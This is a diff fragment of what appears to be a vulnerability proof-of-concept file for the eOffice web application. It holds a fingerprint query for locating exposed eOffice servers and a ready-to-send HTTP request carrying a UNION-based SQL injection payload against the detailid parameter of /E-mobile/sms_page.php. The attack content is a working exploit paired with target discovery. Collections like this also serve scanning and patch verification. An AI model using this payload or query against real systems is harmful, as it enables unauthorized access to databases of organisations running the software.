@@ -9,7 +9,7 @@
 ((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif"    || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server:    couchdb") || banner="general/login/index.php"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
